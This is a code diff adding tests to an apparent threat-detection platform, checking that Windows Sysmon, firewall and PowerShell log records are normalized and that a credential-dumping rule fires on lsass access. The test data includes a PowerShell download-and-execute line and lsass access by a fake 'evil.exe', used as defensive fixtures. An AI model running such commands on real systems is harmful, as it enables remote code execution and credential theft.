@@ -108,3 +108,47 @@ def test_low_and_slow_scenario_detected():
     hit = [i for i in p.incidents.values() if set(i.event_ids) & sc_ids]
     assert hit, "low-and-slow campaign was not detected"
     assert any("slow_burn" in i.tags for i in hit), "no ledger-driven slow-burn incident formed"
+
+
+# --- v2.1: real-EDR schema mapping (Sysmon 10 / WFP 5156 / PowerShell script block) -----------
+def test_normalizer_maps_sysmon10_lsass():
+    from aegis.ingestion.normalizer import normalize
+    from aegis.schemas.events import EventType
+
+    rec = {"EventID": 10, "Hostname": "WS-1", "@timestamp": "2026-01-01T00:00:00Z",
+           "SourceImage": r"C:\Temp\evil.exe", "TargetImage": r"C:\Windows\System32\lsass.exe",
+           "GrantedAccess": "0x1010"}
+    e = normalize(rec, "windows")
+    assert e.event_type == EventType.PROCESS_ACCESS
+    assert e.process_name == "evil.exe"
+    assert e.file_path.lower().endswith("lsass.exe")
+    assert "lsass_access" in e.tags
+
+
+def test_normalizer_maps_wfp_and_scriptblock():
+    from aegis.ingestion.normalizer import normalize
+    from aegis.schemas.events import EventType
+
+    net = normalize({"EventID": 5156, "Hostname": "WS-1", "Application": r"C:\x\powershell.exe",
+                     "SourceAddress": "10.0.0.5", "DestAddress": "45.155.205.233", "DestPort": "443"}, "windows")
+    assert net.event_type == EventType.NETWORK_CONNECTION
+    assert net.dst_ip == "45.155.205.233" and net.dst_port == 443
+
+    sb = normalize({"EventID": 4104, "Hostname": "WS-1",
+                    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"}, "windows")
+    assert sb.event_type == EventType.PROCESS_START
+    assert sb.process_name == "powershell.exe"
+    assert "downloadstring" in sb.command_line.lower()
+
+
+def test_cred003_fires_on_lsass_access(platform):
+    from datetime import UTC, datetime
+
+    from aegis.ingestion.normalizer import normalize
+
+    e = normalize({"EventID": 10, "Hostname": "WS-9", "@timestamp": "2026-01-01T02:00:00Z",
+                   "SourceImage": r"C:\Temp\rundll32.exe", "TargetImage": r"C:\Windows\System32\lsass.exe",
+                   "GrantedAccess": "0x1410"}, "windows")
+    dets = platform.detector.process(e)
+    assert any(d.rule_id == "CRED-003" for d in dets), [d.rule_id for d in dets]
+    assert any("T1003.001" in d.techniques for d in dets)
